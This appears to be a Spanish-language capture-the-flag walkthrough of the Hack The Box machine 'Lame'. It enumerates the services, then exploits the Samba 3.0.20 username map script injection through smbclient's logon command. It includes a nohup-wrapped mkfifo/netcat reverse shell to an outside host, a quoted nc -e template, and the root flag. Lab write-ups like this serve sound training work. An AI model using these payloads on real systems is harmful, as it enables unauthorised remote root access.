ip -> 10.10.10.3

```
└─$ nmap -sCV -T5 10.10.10.3 -Pn -v
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

El puerto Ftp esta abierto para *anonymous*  
```
└─$ ftp 10.10.10.3
Name (10.10.10.3:cucuxii): anonymous
Password: anonymous
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
```
No hay nada, asi que probaré el smb   
```
└─$ crackmapexec smb 10.10.10.3
SMB     10.10.10.3   445  LAME  [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)
└─$ smbclient -L 10.10.10.3 -N 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))

└─$ smbclient //10.10.10.3/tmp -N
smb: \> dir
  .ICE-unix                          DH        0  Thu Oct  6 19:17:56 2022
  vmware-root                        DR        0  Thu Oct  6 19:18:26 2022
  .X11-unix                          DH        0  Thu Oct  6 19:18:23 2022
  .X0-lock                           HR       11  Thu Oct  6 19:18:23 2022
  5573.jsvc_up                        R        0  Thu Oct  6 19:19:00 2022
  vgauthsvclog.txt.0                  R     1600  Thu Oct  6 19:17:54 2022
```
Ninguno de esos archivos sirve (son todo logs de VMware y demas)  
No tenemos web, asi que hay que tirar de las versiones de los servicios a ver si hay alguna vulnerable.  

```
└─$ searchsploit Samba 3.0.20-Debian
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)    | unix/remote/16320.rb
└─$ searchsploit -m unix/remote/16320.rb
```

El exploit tira de metasploit, pero en una linea pone tal que: ```username = "/=`nohup " + payload.encoded + "`" ``` o sea ```"/=`nohup comando`"```
Busque en google -> *smb vuln nohup* y me salio esta [web](https://pentesting.mrw0l05zyn.cl/explotacion/servicios/445-tcp-smb)
```
smbclient //<target>/tmp
logon "./=`nohup nc -e /bin/sh <attacker-IP-address> <listen-port>`"
nc -lvnp <listen-port>
```
```
└─$ smbclient //10.10.10.3/tmp -N 
smb: \> logon "./=`nohup ping -c 1 10.10.14.10`"
Password: 
session setup failed: NT_STATUS_LOGON_FAILURE
└─$ sudo tcpdump -i tun0 icmp -n
20:02:02.562265 IP 10.10.14.10 > 10.10.10.3: ICMP echo reply, id 13336, seq 1, length 64
```
Por tanto ya tenemos RCE
```
smb: \> logon "./=`nohup rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 443 >/tmp/f `"
└─$ sudo nc -nlvp 443 
sh-3.2# whoami
root
sh-3.2# cd /root
sh-3.2# cat root.txt
6e54af03943ee4ebcb4785eab908ef0a
```

